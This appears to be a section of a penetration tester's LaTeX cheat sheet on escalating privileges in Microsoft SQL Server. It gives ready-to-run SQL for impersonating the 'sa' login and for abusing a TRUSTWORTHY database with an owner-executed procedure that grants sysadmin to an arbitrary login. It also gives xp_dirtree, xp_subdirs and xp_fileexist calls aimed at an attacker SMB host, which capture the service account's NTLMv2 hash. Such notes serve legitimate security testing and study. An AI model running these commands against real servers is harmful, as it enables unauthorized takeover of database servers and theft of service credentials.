\section{PrivEsc}


\subsection{Login Impersonation}
MSSQL Server has a statement called \href{https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver16}{EXECUTE AS} which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the \href{https://learn.microsoft.com/en-us/sql/t-sql/statements/revert-transact-sql?view=sql-server-ver16}{REVERT} statement. 

The scope of impersonation is at the server level


Which logins are allowed to impersonate which other logins is controlled by server-level \verb+IMPERSONATE+ permissions, stored in the \verb+sys.server_permissions+ table. 


Note that querying this table will only return information available to the current login.
\begin{verbatim}
SELECT * FROM sys.server_permissions
    JOIN master.sys.server_principals ON grantor_principal_id = principal_id
    WHERE permission_name = 'IMPERSONATE';    
\end{verbatim}
    

\begin{verbatim}
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
\end{verbatim}
    
It's recommended to run \verb+EXECUTE AS LOGIN+ within the master DB  (\verb+USE master+), because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error.  
    


\subsection{Trustworthy Database abuse}

MSSQL Server databases have a property called \href{https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver16}{TRUSTWORTHY}, which indicates whether the MSSQL Server instance should trust the database and the contents within it. By default this is off, however logins with the sysadmin role may enable this in case they need access to server-level resources.

TRUSTWORTHY database property set by default set to OFF to mitigate certain threats that can exist as a result of attaching a database that contains one of the following objects:
\begin{itemize}
    \item Malicious assemblies with an \verb+EXTERNAL_ACCESS+ or \verb+UNSAFE+ permission setting. For more information, see CLR Integration Security.
    \item Malicious modules that are defined to execute as high privileged users. For more information, see \verb+EXECUTE AS+ Clause (Transact-SQL).
\end{itemize}


{\bf If a database is marked as trustworthy, and we have control of or may execute as a user who belongs to the database-level \verb+db_owner+ role, then it is possible to assign the server-level \verb+sysadmin+ role to arbitrary logins.}

List db owner:
\begin{verbatim}
SELECT b.name, c.name
    FROM <bd_name>.sys.database_role_members a
    JOIN <bd_name>.sys.database_principals b ON a.role_principal_id = b.principal_id
    LEFT JOIN <bd_name>.sys.database_principals c ON a.member_principal_id = c.principal_id;
\end{verbatim}


\begin{verbatim}
CREATE PROCEDURE sp_privesc
WITH EXECUTE AS OWNER
AS
    EXEC sp_addsrvrolemember '<user>', 'sysadmin'
GO    

EXECUTE sp_privesc;
DROP PROCEDURE sp_privesc;
    
\end{verbatim}


\subsection{UNC path injection}

MSSQL service account hash can be stolen using \verb+xp_subdirs+ or \verb+xp_dirtree+ undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. Therefore they support \href{https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths}{UNC path} expression. 

NTLMv2 hash can be grabbed either by responder~\ref{tool:responder} or impacket smbserver~\ref{tool:impacket:smbserver}. 

\begin{verbatim}
master..xp_dirtree
master..xp_fileexist
master..xp_subdirs
sys.dm_os_file_exists
fn_trace_gettable
fn_get_audit_file
\end{verbatim}

see~\href{https://www.sqlteam.com/forums/topic.asp?TOPIC_ID=132601}{a},~\ref{https://www.databasejournal.com/ms-sql/useful-undocumented-extended-stored-procedures/}{b} and~\href{https://www.sqlservercentral.com/articles/undocumented-extended-and-stored-procedures}{c} for other functions

\begin{verbatim}
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
EXEC xp_fileexist '\\10.10.110.17\share\';
GO
\end{verbatim}

